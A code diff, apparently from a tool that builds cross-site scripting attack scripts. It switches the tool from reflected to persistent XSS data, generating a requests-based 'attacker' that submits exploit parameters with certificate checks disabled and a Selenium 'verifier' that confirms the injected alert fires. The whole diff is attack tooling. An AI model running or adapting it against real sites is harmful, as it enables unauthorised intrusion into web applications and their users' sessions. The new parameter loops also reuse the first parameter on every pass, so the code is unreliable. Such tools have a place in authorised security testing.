@@ -29,8 +29,10 @@ siteList = [] # list of sites, incase we want to handle multiple sites
 
 # Grab list of sites to watch for
 for x in exploitData: # x is a dict_obj
+	#print x['reflected_page'].split('/')[2]
 	#print x.keys()[0].split('/')[2] # extract just the site name
-	siteList.append(x.keys()[0].split('/')[2])
+	#siteList.append(x.keys()[0].split('/')[2]) #rXSS
+	siteList.append(x['reflected_page'].split('/')[2]) #pXSS
 
 # Processing for multiple site, ignore for now
 #for x in siteList:
@@ -150,18 +152,45 @@ print "Written Login of Requests powered attacker..."
 # navigate to exploited page via requests
 requestsAtk = ""
 for x in exploitData: 
-	for y in x.keys():
-		requestsAtk += "url =\"" + y + "\"\n"
+	requestsAtk += "url =\"" + x['reflected_page'] + "\"\n"
+	if "GET" in x['method']:
+		print "GET"
+		requestsAtk += "exploit_data = {"
+		counter = 0
+		for y in x['params']:
+			counter += 1
+			requestsAtk += "\"" + x['params'][0]['key'] + "\":\"" + x['params'][0]['value'] +"\""
+			if counter < len(x['params']):
+				requestsAtk += ","
+		requestsAtk += "}\n"
+		requestsAtk += "r = requests.get(url, params=exploit_data, verify=False)\n"
+	elif "POST" in x['method']:
+		print "POST"
 		requestsAtk += "exploit_data = dict("
 		counter = 0
-		for z in x[y][0]['params'][0].keys():
+		for y in x['params']:
 			counter += 1
-			requestsAtk += "" + z + "=\"" + x[y][0]['params'][0][z] +"\""
-			if counter < len(x[y][0]['params'][0]):
+			requestsAtk += "" + x['params'][0]['key'] + "=\"" + x['params'][0]['value'] +"\""
+			if counter < len(x['params']):
 				requestsAtk += ","
 		requestsAtk += ") #build params\n"
 		requestsAtk += "r = session.post(url, data=exploit_data, verify=False)\n"
-		requestsAtk += "print \"attacked \" + url + \" ...\"\n\n"
+	requestsAtk += "print \"attacked \" + url + \" ...\"\n\n"
+
+
+# for x in exploitData: 
+# 	for y in x.keys():
+# 		requestsAtk += "url =\"" + y + "\"\n"
+# 		requestsAtk += "exploit_data = dict("
+# 		counter = 0
+# 		for z in x[y][0]['params'][0].keys():
+# 			counter += 1
+# 			requestsAtk += "" + z + "=\"" + x[y][0]['params'][0][z] +"\""
+# 			if counter < len(x[y][0]['params'][0]):
+# 				requestsAtk += ","
+# 		requestsAtk += ") #build params\n"
+# 		requestsAtk += "r = session.post(url, data=exploit_data, verify=False)\n"
+# 		requestsAtk += "print \"attacked \" + url + \" ...\"\n\n"
 print "\nWriting Attack module of Requests powered attacker..."
 attackScript.write(requestsAtk)
 print "Written Attack of Requests powered attacker..."
@@ -226,25 +255,25 @@ print "Written Login of Selenium powered verifier..."
 
 # navigate to exploited page via selenium
 for x in exploitData: 
-	for y in x.keys():
-		exploitedPage = y
-		seleniumNav = "#==== Verifying attack on " + exploitedPage + "\n"
-		seleniumNav += "attackString = \""+ attackString +"\"\n"
-		seleniumNav += "driver.get(\""+ exploitedPage +"\")\n"
-		seleniumNav += "try:\n"
-		seleniumNav += "# Go through all alerts until attackString found\n"
-		seleniumNav += "	while EC.alert_is_present():\n"
-		seleniumNav += "	    alert = driver.switch_to_alert()\n"
-		seleniumNav += "	    if attackString in alert.text:\n"
-		seleniumNav += "	    	print \"exploit verified in \" + driver.current_url\n"
-		seleniumNav += "	    alert.accept()\n"
-		seleniumNav += "	    time.sleep(2)\n"
-		seleniumNav += "except NoAlertPresentException:\n"
-		seleniumNav += "	print \"Cleared all alerts on page\"\n\n"
-		seleniumNav += "time.sleep(3)\n\n"
-		print "Writing Exploit verifier for "+ exploitedPage +" ..."
-		attackScript.write(seleniumNav)
-		print "Written Exploit verifier for "+ exploitedPage +" ..."
+	# for y in x.keys():
+	exploitedPage = x['reflected_page']
+	seleniumNav = "#==== Verifying attack on " + exploitedPage + "\n"
+	seleniumNav += "attackString = \""+ attackString +"\"\n"
+	seleniumNav += "driver.get(\""+ exploitedPage +"\")\n"
+	seleniumNav += "try:\n"
+	seleniumNav += "# Go through all alerts until attackString found\n"
+	seleniumNav += "	while EC.alert_is_present():\n"
+	seleniumNav += "	    alert = driver.switch_to_alert()\n"
+	seleniumNav += "	    if attackString in alert.text:\n"
+	seleniumNav += "	    	print \"exploit verified in \" + driver.current_url\n"
+	seleniumNav += "	    alert.accept()\n"
+	seleniumNav += "	    time.sleep(2)\n"
+	seleniumNav += "except NoAlertPresentException:\n"
+	seleniumNav += "	print \"Cleared all alerts on page\"\n\n"
+	seleniumNav += "time.sleep(3)\n\n"
+	print "Writing Exploit verifier for "+ exploitedPage +" ..."
+	attackScript.write(seleniumNav)
+	print "Written Exploit verifier for "+ exploitedPage +" ..."
 
 seleniumClose = "driver.quit()"
 
